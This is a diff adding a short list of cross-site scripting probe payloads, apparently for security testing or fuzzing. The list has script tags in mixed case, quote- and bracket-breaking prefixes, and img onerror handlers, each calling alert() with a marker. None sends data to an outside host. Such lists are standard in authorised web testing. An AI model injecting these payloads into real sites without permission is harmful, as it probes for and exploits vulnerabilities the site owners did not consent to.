@@ -1,0 +1,18 @@
+<script>alert("xsspayload");</script>
+<script>alert(123);</script>
+<ScRipt>alert(123)</ScRipt>
+<SCRIPT>alert(123)</SCRIPT>
+<script>alert('xsspayload');</script>
+<script>alert(`xsspayload`);</script>
+><script>alert("xsspayload");</script>
+"><script>alert("xsspayload");</script>
+'><script>alert("xsspayload");</script>
+
+';alert(123);//
+";alert(123);//
+`;alert(123);//
+\";alert(123);//
+
+<img src="xxx.x" onerror=javascript:alert(123)>
+><img src="xxx.x" onerror=javascript:alert(123)>
+'"`>xsspayload<img src="xxx.x" onerror=javascript:alert(123)>
